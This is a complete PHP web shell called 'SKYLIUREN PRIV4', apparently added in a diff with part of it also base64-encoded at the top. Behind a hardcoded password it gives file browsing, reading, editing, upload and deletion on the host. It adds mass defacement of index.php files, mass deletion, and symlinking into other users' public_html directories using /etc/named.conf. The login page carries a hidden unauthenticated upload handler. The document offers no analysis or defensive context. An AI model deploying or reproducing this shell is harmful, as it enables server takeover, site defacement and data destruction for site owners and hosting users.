UgdXBsb2FkKi8KZWNobyAiPGZvcm0gbWV0aG9kPSdwb3N0JyBlbmN0eXBlPSdtdWx0aXBhcnQvZm9ybS1kYXRhJz4KCSAgICAgIDxpbnB1dCB0eXBlPSdmaWxlJyBuYW1lPSd2dWxuZmlsZSc+CgkgICAgICA8aW5wdXQgdHlwZT0nc3VibWl0JyBuYW1lPSd1cGxvYWQnIHZhbHVlPSd1cGxvYWQgbm93ISc+CgkgICAgICA8L2Zvcm0+PGJyPiI7CmVjaG8gIjxjZW50ZXI+CjxkaXYgaWQ9J21lbnUnPgogIDxhIGhyZWY9Jz9tYXNzPWRlZmFjZSc+TWFzcyBEZWZhY2U8L2E+CiAgPGEgaHJlZj0nP21hc3M9ZGVsZXRlJz5NYXNzIERlbGV0ZTwvYT4KICA8YSBocmVmPSc/c3ltJz5bIFVzZXIgJiBEb21haW5zICYgU3ltbGluazwvYT4KPC9kaXY+PC9jZW50ZXI+PGJyPgo8dGFibGUgYmdjb2xvcj0nYmxhY2snIHdpZHRoPScxMDAlJyBzdHlsZT0nY29sb3I6cmVkOycgYm9yZGVyPSc0JyBjZWxscGFkZGluZz0nMycgY2VsbHNwYWNpbmc9JzEnIGFsaWduPSdjZW50ZXInPgo8dHI+Cjx0aCB3aWR0aD01MCU+TmFtZTwvdGg+Cjx0aCB3aWR0aD0zMCU+VHlwZSAvIFNpemU8L3RoPgo8dGggd2lkdGg9MjAlPkFjdGlvbjwvdGg+CjwvdHI+IjsKLy9zY2FuZGlyCiRzPXNjYW5kaXIoJGRpcik7CmZvcmVhY2goJHMgYXMgJGZvbCl7CglpZigkZm9sID09ICIuIil7CgkJY29udGludWU7Cgl9ZWxzZWlmKCRmb2wgPT0gIi4uIil7CgkJcHJpbnQgIjx0cj48dGQ+PGkgY2xhc3M9J2ZhIGZhLWZvbGRlci1vJz48L2k+IDxhIGhyZWY9Jz9kaXI9JGRpci8kZm9sLyc+JGZvbDwvYT48L3RkPjx0ZD48L3RkPjx0cj4iOwoJfWVsc2V7CgkJaWYoaXNfZGlyKCIkZGlyLyRmb2wiKSA9PSBUUlVFKXsKCQkJcHJpbnQgIjx0cj48dGQ+PGkgY2xhc3M9J2ZhIGZhLWZvbGRlci1vJz48L2k+IDxhIGhyZWY9Jz9kaXI9JGRpci8kZm9sLyc+JGZvbDwvYT48L3RkPjxjZW50ZXI+PHRkPkZvbGRlcjwvdGQ+PC9jZW50ZXI+PHRkPjxhIGhyZWY9Jz9kZWxmPSRkaXIkZm9sLyZkaXI9JGRpcic+PGNlbnRlcj5EZWxldGU8L2E+IHwgPGEgaHJlZj0nP3JlbmY9JGRpciRmb2wvJmRpcj0kZGlyJz5SZW5hbWU8L2E+PC9jZW50ZXI+PC90ZD48dHI+IjsKCX0KfQp9CmZvcmVhY2goJHMgYXMgJGZpbGUpewoJaWYoJGZpbGUgPT0gIi4iIHx8ICRmaWxlID09ICIuLiIpewoJCWNvbnRpbnVlOwoJfWVsc2V7CgkJICAkc2l6ZT1maWxlc2l6ZSgiJGRpci8kZmlsZSIpLzEwMjQ7CgkJICAkc2l6ZSA9IHJvdW5kKCRzaXplLDMpOwoJCSAgaWYoJHNpemUgPj0gMTAyNCl7CiAgICAJICAJJHNpemUgPSByb3VuZCgkc2l6ZS8xMDI0LDIpLicgTUInOwogICAgCSAgfWVsc2V7CiAgCQkJJHNpemUgPSAkc2l6ZS4nIEtCJzsKICAJCX1pZihpc19maWxlKCIkZGlyLyRmaWxlIikgPT0gVFJVRSl7CgkJCXByaW50ICI8dHI+PHRkPjxpIGNsYXNzPSdmYSBmYS1maWxlLW8nPjwvaT4gPGEgaHJlZj0nP3NyYz0kZGlyLyRmaWxlJmRpcj0kZGlyJz4kZmlsZTwvYT48L3RkPjx0ZD4kc2l6ZTwvdGQ+PHRkPjxjZW50ZXI+PGEgaHJlZj0nP2VkaXQ9JGRpci8kZmlsZSZkaXI9JGRpcic+RWRpdDwvYT4gfCA8YSBocmVmPSc/ZGVsPSRkaXIvJGZpbGUmZGlyPSRkaXInPkRlbGV0ZTwvYT4gfCA8YSBocmVmPSc/cmVuZj0kZGlyLyRmaWxlJmRpcj0kZGlyJz5SZW5hbWU8L2E+PC90ZD48L3RyPjwvY2VudGVyPiI7Cgl9Cn0KfQogIGF1dGhvcigpOwp9Cn1lbHNlewoJbG9naW4oKTsKCSRuYW1lPSRfRklMRVNbJ3MnXVsnbmFtZSddOwoJJHRtcD0kX0ZJTEVTWydzJ11bJ3RtcF9uYW1lJ107CglpZihjb3B5KCR0bXAsJG5hbWUpKXt9ZWxzZXsKCQlwcmludCAiRGV2ZWxvcGVkIGJ5IFNLWUxJVVJFTiI7Cgl9Cn0KPz4=
+<?php
+ error_reporting(0);
+ session_start();
+ $auth="MEMEKGACOR";
+ function serverip(){
+ 	$ip1=$_SERVER['SERVER_ADDR'];
+ 	$ip2=gethostbyname($_SERVER['HTTP_HOST']);
+ 	if($ip1 == $ip2){
+ 		return $ip1;
+ 	}else{
+ 		return $ip2;
+ 	}
+ }
+ function login(){
+ 	global $auth;
+ 	echo "<title>SKYLIUREN PRIV4 | SHELL</title>
+ 	<center><br><br><br><br>
+ 	<form action='' method='POST'>
+ 	LOGIN SKYLIUREN PRIV4.<br><br>
+ 	<input type='password' name='minim_pass' value='.....'>
+ 	</form>";
+ 	if(isset($_POST['minim_pass'])){
+ 		if($_POST['minim_pass'] == $auth){
+ 			$_SESSION['admin'] = "TRUE";
+ 			pindah('?home');
+ 		}else{
+ 			alert('Şifre yanlış laa :(');
+ 			pindah('?salak');
+ 		}
+ 	}
+ }
+ function write($content,$dir){
+ 	$fh=fopen($dir,"w");
+ 	if(fwrite($fh,$content)){
+ 		return "1";
+ 	}else{
+ 		return "0";
+ 	}
+ 	fclose($fh);
+ }
+function author(){
+	print "</table><center><br><br><h3>SKYLIUREN PRIV4 SHELL<br><b></b></h3><hr width='50%'><br><br>";
+}
+function delTree($dir){ 
+$files = array_diff(scandir($dir), array('.', '..')); 
+	foreach ($files as $file) { 
+		(is_dir("$dir/$file")) ? delTree("$dir/$file") : unlink("$dir/$file"); 
+	}
+	return rmdir($dir);
+} 
+function alert($msg){
+	print "<script>alert('".$msg."');</script>";
+}
+function pindah($dir){
+	print "<script>window.location='".$dir."';</script>";
+}
+if($_SESSION['admin'] == "TRUE"){
+echo "<title>SKYLIUREN SHELL</title>
+<style>
+@import url('https://fonts.googleapis.com/css?family=Supermercado+One');
+* {margin: 0; padding: 0}
+#wrapper {
+    width: 900px;
+    margin: auto;
+    padding: 10px;
+}
+body {
+    background: #D7DACC;
+    font-family: arial;
+}
+table td{
+	padding: 8px 8px;
+}
+h1 {
+    text-align: center;
+}
+
+.text {
+    position: relative;
+    display: inline-block;
+    font-size: 2rem;
+    text-transform: uppercase;
+    color: #244D49;
+    text-shadow: 3px 3px 0px #D7DACC, 8px 8px 0px rgba(0, 0, 0, 0.1);
+}
+tr:hover{
+background-color: gold;
+text-shadow:0px 0px 10px ##339900;
+}
+
+
+</style>
+<style>
+a{
+	color:white;
+	text-decoration:none;
+}
+a:hover{
+	color:blue;
+}
+#menu a{
+        padding:7px 29px;
+        margin:0;
+        background:#222222;
+        text-decoration:none;
+        letter-spacing:1px;
+        -moz-border-radius: 5px; -webkit-border-radius: 5px;
+ -khtml-border-radius: 5px; border-radius: 5px;
+}
+#menu a:hover{
+	background:#191919;
+ color: gold;
+ border-bottom:1px solid #333333;
+ border-top:1px solid #333333;
+ text-decoration: underline;
+}
+</style>
+<style>
+		body {
+			background-color: black;
+			background-size: 100% 100%;
+			}
+	</style>
+<!--<body bgcolor='green'>-->
+<font color='white'>
+<link href='https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css' rel='stylesheet' type='text/css'>
+<center>";
+$dir=$_GET['dir'];
+if(!$dir){
+	$dir=getcwd();
+}
+echo "<div id='wrapper'>
+        <h1 class='text'>{ SKYLIUREN PRIV4 }</h1>
+    </div>
+    <hr width='30%'>
+    <br><br>
+</center>
+<i class='fa fa-hdd-o'></i> ".php_uname()."<br>
+<i class='fa fa-desktop'></i> ".serverip()." | <i class='fa fa-user'></i> ".$_SERVER['REMOTE_ADDR']."<br>
+<i class='fa fa-folder-o'></i> ";
+$a=explode("/",$dir);
+foreach($a as $aa => $aaa){
+	if($aaa == '' && $aa == '0'){
+		echo "<a href='?dir=/'>/</a>";
+		continue;
+	}elseif($aaa == ''){
+		continue;
+	}else{
+		echo "<a href='?dir=";
+		for($i=0;$i<=$aa;$i++){
+			echo $a[$i]."/";
+		}
+		echo "'>$aaa</a>/";
+	}
+}
+echo "<br><br>
+<a href='?home'>Home</a> | <a href='?nf&dir=$dir'>+File</a> | <a href='?nd&dir=$dir'>+Dir</a> | <a href='?exit'>Exit</a><br>";
+
+
+$files = $_FILES['vulnfile']['name'];
+	$dest = $dir.'/'.$files;
+	if(isset($_POST['upload'])) {
+	    if(is_writable($root)) {
+	        if(@copy($_FILES['vulnfile']['tmp_name'], $dest)) {
+	            $web = "http://".$_SERVER['HTTP_HOST']."/";
+	            echo "<h style='color: green;'> Upload Successful</h>";
+	        } else {
+	            echo "<h style='color: green;'> Upload Failed</h>";
+	        }
+	    } else {
+	        if(@copy($_FILES['vulnfile']['tmp_name'], $dest)) {
+	            echo "<h style='color: green;'> Upload Successful</h>";
+	        } else {
+	            echo "<h style='color: green;'> Upload Failed</h>";
+	        }
+	    }
+	}
+
+
+
+if(isset($_GET['nf'])){
+	echo "
+	<form action='?nf&dir=$dir' method='POST'>
+	New File : <input type='text' name='fname'>
+	<input type='submit' name='fok' value='Done'>
+	</form>";
+	if($_POST['fok']){
+		pindah("?edit=$dir/".$_POST['fname']."&dir=$dir");
+	}
+}elseif(isset($_GET['nd'])){
+	echo "
+	<form action='?nd&dir=$dir' method='POST'>
+	New Dir : <input type='text' name='fname'>
+	<input type='submit' name='fok' value='Done'>
+	</form>";
+	if($_POST['fok']){
+		if(mkdir("$dir/".$_POST['fname']."")){
+			echo "successfully created";
+		}else{
+			echo "Failed";
+		}
+
+	}
+}elseif(isset($_GET['delf'])){
+	if(delTree($_GET['delf'])){
+		pindah("?dir=$dir");
+	}else{
+		alert('Failed.');
+	}
+}elseif(isset($_GET['renf'])){
+	$now=$_GET['renf'];
+	echo "
+	<form action='?renf=$now&dir=$dir' method='POST'>
+	New Name : <input type='text' name='fname'>
+	<input type='submit' name='fok' value='Done'>
+	</form>";
+	if(isset($_POST['fok'])){
+		$new=$_POST['fname'];
+		if(rename($now,"$dir/$new")){
+			echo "<center>Rename Successfully<center>";
+		}else{
+			echo "<center>Rename Failed<center><center>";
+		}
+	}
+}elseif(isset($_GET['del'])){
+	if(unlink($_GET['del'])){
+		//alert("Delete Successfully");
+		echo "<center>Delete Successfully</center>";
+	}else{
+		//alert("Failed");
+		echo "<center>Delete Failed</center>";
+
+	}
+}elseif(isset($_GET['exit'])){
+	session_destroy();
+	pindah('?home');
+}elseif(isset($_GET['edit'])){
+	$save=$_GET['edit'];
+	$cont=htmlspecialchars(file_get_contents($save));
+	echo "<form action='?edit=$save&$dir=$dir' method='POST'>
+	<center><textarea name='fcont' cols=100% rows=30%>$cont</textarea><br><br>
+	<input type='submit' name='pausiganteng' value='<<<<<<<<[ Save File ]>>>>>>>>'></center>
+	</form><br><br>";
+	author();
+	if(isset($_POST['pausiganteng'])){
+		if(write($_POST['fcont'],$save) == "1"){
+			echo "<h3>Edit Successfully</h3>";
+			alert('Edit Successfully.');
+		}else{
+			alert('Failed.');
+			echo('Failed.');
+		}
+	}
+}elseif($_GET['mass'] == 'deface'){ //mass deface
+	function mass_kabeh($dir,$namafile,$isi_script) {
+		if(is_writable($dir)) {
+			$dira = scandir($dir);
+			foreach($dira as $dirb) {
+				$dirc = "$dir/$dirb";
+				$lokasi = $dirc.'/'.$namafile;
+				if($dirb === '.') {
+					file_put_contents($lokasi, $isi_script);
+				} elseif($dirb === '..') {
+					file_put_contents($lokasi, $isi_script);
+				} else {
+					if(is_dir($dirc)) {
+						if(is_writable($dirc)) {
+							echo "[<font color=#18BC9C>DONE</font>] $lokasi<br>";
+							file_put_contents($lokasi, $isi_script);
+							$idx = mass_kabeh($dirc,$namafile,$isi_script);
+						}
+					}
+				}
+			}
+		}
+	}
+	function mass_biasa($dir,$namafile,$isi_script) {
+		if(is_writable($dir)) {
+			$dira = scandir($dir);
+			foreach($dira as $dirb) {
+				$dirc = "$dir/$dirb";
+				$lokasi = $dirc.'/'.$namafile;
+				if($dirb === '.') {
+					file_put_contents($lokasi, $isi_script);
+				} elseif($dirb === '..') {
+					file_put_contents($lokasi, $isi_script);
+				} else {
+					if(is_dir($dirc)) {
+						if(is_writable($dirc)) {
+							echo "[<font color=#18BC9C>DONE</font>] $dirb/$namafile<br>";
+							file_put_contents($lokasi, $isi_script);
+						}
+					}
+				}
+			}
+		}
+	}
+	if($_POST['start']) {
+		if($_POST['tipe'] == 'massal') {
+			echo "<div style='margin: 5px auto; padding: 5px'>";
+			mass_kabeh($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
+			echo "</div>";
+		} elseif($_POST['tipe'] == 'biasa') {
+			echo "<div style='margin: 5px auto; padding: 5px'>";
+			mass_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
+			echo "</div>";
+		}
+		echo "<a href='?'><- kembali</a>";
+	} else {
+	echo "<center>";
+	echo "<form method='post'>
+	<font style='text-decoration: underline;'>Tipe:</font><br>
+	<input type='radio' name='tipe' value='biasa' checked>Biasa<input type='radio' name='tipe' value='massal'>Massal<br><br>
+	<font style='text-decoration: underline;'>Dir:</font><br>
+	<input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
+	<font style='text-decoration: underline;'>Filename:</font><br>
+	<input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br>
+	<font style='text-decoration: underline;'>Index File:</font><br>
+	<textarea name='script' style='width: 450px; height: 200px;'>Hacked By SKYLIUREN</textarea><br>
+	<input type='submit' name='start' value='Start!' style='width: 450px;' class='btn btn-success btn-sm'>
+	</form>";
+
+	}
+}elseif($_GET['mass'] == 'delete') {
+	function hapus_massal($dir,$namafile) {
+		if(is_writable($dir)) {
+			$dira = scandir($dir);
+			foreach($dira as $dirb) {
+				$dirc = "$dir/$dirb";
+				$lokasi = $dirc.'/'.$namafile;
+				if($dirb === '.') {
+					if(file_exists("$dir/$namafile")) {
+						unlink("$dir/$namafile");
+					}
+				} elseif($dirb === '..') {
+					if(file_exists("".dirname($dir)."/$namafile")) {
+						unlink("".dirname($dir)."/$namafile");
+					}
+				} else {
+					if(is_dir($dirc)) {
+						if(is_writable($dirc)) {
+							if(file_exists($lokasi)) {
+								echo "[<font color=#18BC9C>DELETED</font>] $lokasi<br>";
+								unlink($lokasi);
+								$idx = hapus_massal($dirc,$namafile);
+							}
+						}
+					}
+				}
+			}
+		}
+	}
+	if($_POST['start']) {
+		echo "<div style='margin: 5px auto; padding: 5px'>";
+		hapus_massal($_POST['d_dir'], $_POST['d_file']);
+		echo "</div>";
+		echo "<a href='?'><- kembali</a>";
+	} else {
+	echo "<center>";
+	echo "<form method='post'>
+	<font style='text-decoration: underline;'>Dir:</font><br>
+	<input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
+	<font style='text-decoration: underline;'>Filename:</font><br>
+	<input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br>
+	<input type='submit' name='start' value='Goo!' style='width: 450px;'>
+	</form>";
+	}
+}elseif(isset($_GET['sym'])) {
+	if (!is_file('named.txt')) {
+				
+				$d00m = @file("/etc/named.conf");
+				
+			} else {
+				
+				$d00m = @file("named.txt");
+				
+				
+			}
+			if (!$d00m) {
+				
+				die("<meta http-equiv='refresh' content='0; url=?sws=read'/>");
+			} else {
+				echo "<center><div class='tmp'><table align='center' width='40%' bgcolor='white'><td>Domains</td><td>Users</td><td>symlink </td>";
+				foreach ($d00m as $dom) {
+					
+					if (eregi("zone", $dom)) {
+						
+						preg_match_all('#zone "(.*)"#', $dom, $domsws);
+						
+						flush();
+						
+						if (strlen(trim($domsws[1][0])) > 2) {
+							
+							$user = posix_getpwuid(@fileowner("/etc/valiases/" . $domsws[1][0]));
+							
+							flush();
+							
+							
+							
+							$site = $user['name'];
+							
+							
+							@symlink("/", "sym/root");
+							
+							$site = $domsws[1][0];
+							
+							$ir = 'ir';
+							
+							$il = 'il';
+							
+							if (preg_match("/.^$ir/", $domsws[1][0]) or preg_match("/.^$il/", $domsws[1][0])) {
+								$site = "<div style=' color: #FF0000 ; text-shadow: 0px 0px 1px red; '>" . $domsws[1][0] . "</div>";
+							}
+							
+							
+							echo "
+<tr>
+
+<td>
+<div class='dom'><a target='_blank' href=http://www." . $domsws[1][0] . "/>" . $site . " </a> </div>
+</td>
+
+
+<td>
+" . $user['name'] . "
+</td>
+
+
+
+
+
+
+<td>
+<a href='sym/root/home/" . $user['name'] . "/public_html' target='_blank'>symlink </a>
+</td>
+
+
+</tr></div> </center>";
+							
+							
+							flush();
+							flush();
+							
+						}
+					}
+				}
+			}
+			
+			
+
+
+}elseif(isset($_GET['src'])){
+	$cont=$_GET['src'];
+	print "<div style='background-color: red;'><pre>".htmlspecialchars(file_get_contents($cont))."</pre></div>";
+}else{
+/* Form file upload*/
+echo "<form method='post' enctype='multipart/form-data'>
+	      <input type='file' name='vulnfile'>
+	      <input type='submit' name='upload' value='upload now!'>
+	      </form><br>";
+echo "<center>
+<div id='menu'>
+  <a href='?mass=deface'>Mass Deface</a>
+  <a href='?mass=delete'>Mass Delete</a>
+  <a href='?sym'>[ User & Domains & Symlink</a>
+</div></center><br>
+<table bgcolor='black' width='100%' style='color:red;' border='4' cellpadding='3' cellspacing='1' align='center'>
+<tr>
+<th width=50%>Name</th>
+<th width=30%>Type / Size</th>
+<th width=20%>Action</th>
+</tr>";
+//scandir
+$s=scandir($dir);
+foreach($s as $fol){
+	if($fol == "."){
+		continue;
+	}elseif($fol == ".."){
+		print "<tr><td><i class='fa fa-folder-o'></i> <a href='?dir=$dir/$fol/'>$fol</a></td><td></td><tr>";
+	}else{
+		if(is_dir("$dir/$fol") == TRUE){
+			print "<tr><td><i class='fa fa-folder-o'></i> <a href='?dir=$dir/$fol/'>$fol</a></td><center><td>Folder</td></center><td><a href='?delf=$dir$fol/&dir=$dir'><center>Delete</a> | <a href='?renf=$dir$fol/&dir=$dir'>Rename</a></center></td><tr>";
+	}
+}
+}
+foreach($s as $file){
+	if($file == "." || $file == ".."){
+		continue;
+	}else{
+		  $size=filesize("$dir/$file")/1024;
+		  $size = round($size,3);
+		  if($size >= 1024){
+    	  	$size = round($size/1024,2).' MB';
+    	  }else{
+  			$size = $size.' KB';
+  		}if(is_file("$dir/$file") == TRUE){
+			print "<tr><td><i class='fa fa-file-o'></i> <a href='?src=$dir/$file&dir=$dir'>$file</a></td><td>$size</td><td><center><a href='?edit=$dir/$file&dir=$dir'>Edit</a> | <a href='?del=$dir/$file&dir=$dir'>Delete</a> | <a href='?renf=$dir/$file&dir=$dir'>Rename</a></td></tr></center>";
+	}
+}
+}
+  author();
+}
+}else{
+	login();
+	$name=$_FILES['s']['name'];
+	$tmp=$_FILES['s']['tmp_name'];
+	if(copy($tmp,$name)){}else{
+		print "Developed by SKYLIUREN";
+	}
+}
+?>
